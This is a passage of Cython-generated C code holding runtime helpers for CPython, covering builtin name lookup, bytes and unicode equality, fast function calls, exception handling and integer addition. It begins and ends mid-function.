    PyObject* result = __Pyx_PyObject_GetAttrStrNoError(__pyx_b, name);
    if (unlikely(!result) && !PyErr_Occurred()) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* TupleAndListFromArray */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE void __Pyx_copy_object_array(PyObject *const *CYTHON_RESTRICT src, PyObject** CYTHON_RESTRICT dest, Py_ssize_t length) {
    PyObject *v;
    Py_ssize_t i;
    for (i = 0; i < length; i++) {
        v = dest[i] = src[i];
        Py_INCREF(v);
    }
}
static CYTHON_INLINE PyObject *
__Pyx_PyTuple_FromArray(PyObject *const *src, Py_ssize_t n)
{
    PyObject *res;
    if (n <= 0) {
        Py_INCREF(__pyx_empty_tuple);
        return __pyx_empty_tuple;
    }
    res = PyTuple_New(n);
    if (unlikely(res == NULL)) return NULL;
    __Pyx_copy_object_array(src, ((PyTupleObject*)res)->ob_item, n);
    return res;
}
static CYTHON_INLINE PyObject *
__Pyx_PyList_FromArray(PyObject *const *src, Py_ssize_t n)
{
    PyObject *res;
    if (n <= 0) {
        return PyList_New(0);
    }
    res = PyList_New(n);
    if (unlikely(res == NULL)) return NULL;
    __Pyx_copy_object_array(src, ((PyListObject*)res)->ob_item, n);
    return res;
}
#endif

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* fastcall */
#if CYTHON_METH_FASTCALL
static CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s)
{
    Py_ssize_t i, n = PyTuple_GET_SIZE(kwnames);
    for (i = 0; i < n; i++)
    {
        if (s == PyTuple_GET_ITEM(kwnames, i)) return kwvalues[i];
    }
    for (i = 0; i < n; i++)
    {
        int eq = __Pyx_PyUnicode_Equals(s, PyTuple_GET_ITEM(kwnames, i), Py_EQ);
        if (unlikely(eq != 0)) {
            if (unlikely(eq < 0)) return NULL;  // error
            return kwvalues[i];
        }
    }
    return NULL;  // not found (no exception set)
}
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#elif CYTHON_COMPILING_IN_LIMITED_API
    if (unlikely(!__pyx_m)) {
        return NULL;
    }
    result = PyObject_GetAttr(__pyx_m, name);
    if (likely(result)) {
        return result;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL && !CYTHON_VECTORCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object"))) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectFastCall */
static PyObject* __Pyx_PyObject_FastCall_fallback(PyObject *func, PyObject **args, size_t nargs, PyObject *kwargs) {
    PyObject *argstuple;
    PyObject *result;
    size_t i;
    argstuple = PyTuple_New((Py_ssize_t)nargs);
    if (unlikely(!argstuple)) return NULL;
    for (i = 0; i < nargs; i++) {
        Py_INCREF(args[i]);
        PyTuple_SET_ITEM(argstuple, (Py_ssize_t)i, args[i]);
    }
    result = __Pyx_PyObject_Call(func, argstuple, kwargs);
    Py_DECREF(argstuple);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject **args, size_t _nargs, PyObject *kwargs) {
    Py_ssize_t nargs = __Pyx_PyVectorcall_NARGS(_nargs);
#if CYTHON_COMPILING_IN_CPYTHON
    if (nargs == 0 && kwargs == NULL) {
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
        if (__Pyx_IsCyOrPyCFunction(func))
#else
        if (PyCFunction_Check(func))
#endif
        {
            if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
                return __Pyx_PyObject_CallMethO(func, NULL);
            }
        }
    }
    else if (nargs == 1 && kwargs == NULL) {
        if (PyCFunction_Check(func))
        {
            if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
                return __Pyx_PyObject_CallMethO(func, args[0]);
            }
        }
    }
#endif
    #if PY_VERSION_HEX < 0x030800B1
    #if CYTHON_FAST_PYCCALL
    if (PyCFunction_Check(func)) {
        if (kwargs) {
            return _PyCFunction_FastCallDict(func, args, nargs, kwargs);
        } else {
            return _PyCFunction_FastCallKeywords(func, args, nargs, NULL);
        }
    }
    #if PY_VERSION_HEX >= 0x030700A1
    if (!kwargs && __Pyx_IS_TYPE(func, &PyMethodDescr_Type)) {
        return _PyMethodDescr_FastCallKeywords(func, args, nargs, NULL);
    }
    #endif
    #endif
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs);
    }
    #endif
    #endif
    #if CYTHON_VECTORCALL
    vectorcallfunc f = _PyVectorcall_Function(func);
    if (f) {
        return f(func, args, (size_t)nargs, kwargs);
    }
    #elif defined(__Pyx_CyFunction_USED) && CYTHON_BACKPORT_VECTORCALL
    if (__Pyx_CyFunction_CheckExact(func)) {
        __pyx_vectorcallfunc f = __Pyx_CyFunction_func_vectorcall(func);
        if (f) return f(func, args, (size_t)nargs, kwargs);
    }
    #endif
    if (nargs == 0) {
        return __Pyx_PyObject_Call(func, __pyx_empty_tuple, kwargs);
    }
    return __Pyx_PyObject_FastCall_fallback(func, args, (size_t)nargs, kwargs);
}

/* PyObjectCallOneArg */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *args[2] = {NULL, arg};
    return __Pyx_PyObject_FastCall(func, args+1, 1 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
}

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_value == NULL || exc_info->exc_value == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    PyObject *exc_value = exc_info->exc_value;
    if (exc_value == NULL || exc_value == Py_None) {
        *value = NULL;
        *type = NULL;
        *tb = NULL;
    } else {
        *value = exc_value;
        Py_INCREF(*value);
        *type = (PyObject*) Py_TYPE(exc_value);
        Py_INCREF(*type);
        *tb = PyException_GetTraceback(exc_value);
    }
  #elif CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
  #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
  #endif
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4
    _PyErr_StackItem *exc_info = tstate->exc_info;
    PyObject *tmp_value = exc_info->exc_value;
    exc_info->exc_value = value;
    Py_XDECREF(tmp_value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
  #else
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
  #endif
}
#endif

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = __Pyx_PyType_GetSlot(a, tp_base, PyTypeObject*);
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
static CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (cls == a || cls == b) return 1;
    mro = cls->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            PyObject *base = PyTuple_GET_ITEM(mro, i);
            if (base == (PyObject *)a || base == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(cls, a) || __Pyx_InBases(cls, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    if (exc_type1) {
        return __Pyx_IsAnySubtype2((PyTypeObject*)err, (PyTypeObject*)exc_type1, (PyTypeObject*)exc_type2);
    } else {
        return __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type = NULL, *local_value, *local_tb = NULL;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
  #if PY_VERSION_HEX >= 0x030C00A6
    local_value = tstate->current_exception;
    tstate->current_exception = 0;
    if (likely(local_value)) {
        local_type = (PyObject*) Py_TYPE(local_value);
        Py_INCREF(local_type);
        local_tb = PyException_GetTraceback(local_value);
    }
  #else
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
  #endif
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE && PY_VERSION_HEX >= 0x030C00A6
    if (unlikely(tstate->current_exception))
#elif CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
      #if PY_VERSION_HEX >= 0x030B00a4
        tmp_value = exc_info->exc_value;
        exc_info->exc_value = local_value;
        tmp_type = NULL;
        tmp_tb = NULL;
        Py_XDECREF(local_type);
        Py_XDECREF(local_tb);
      #else
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
      #endif
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {
    CYTHON_MAYBE_UNUSED_VAR(intval);
    CYTHON_MAYBE_UNUSED_VAR(inplace);
    CYTHON_UNUSED_VAR(zerodivision_check);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
        
            x = (long)((unsigned long)a + (unsigned long)b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        if (unlikely(__Pyx_PyLong_IsZero(op1))) {
            return __Pyx_NewRef(op2);
        }
        if (likely(__Pyx_PyLong_IsCompact(op1))) {
            a = __Pyx_PyLong_CompactValue(op1);
        } else {
            const digit* digits = __Pyx_PyLong_Digits(op1);
            const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(op1);
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
